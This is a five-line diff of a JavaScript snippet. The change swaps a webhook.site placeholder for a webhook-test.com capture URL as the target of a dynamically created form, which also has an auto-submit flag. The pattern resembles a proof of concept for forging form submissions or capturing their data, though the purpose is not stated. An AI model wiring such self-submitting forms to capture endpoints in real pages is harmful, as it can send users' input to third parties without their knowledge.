@@ -1,5 +1,5 @@
 (function(){
-  const ACTION_URL = 'https://webhook.site/your-unique-id-here';
+  const ACTION_URL = 'https://webhook-test.com/23dbd7f9f4b453a5720443d2ea9ef1b5';
   const AUTO_SUBMIT = false;
 
   const form = document.createElement('form');
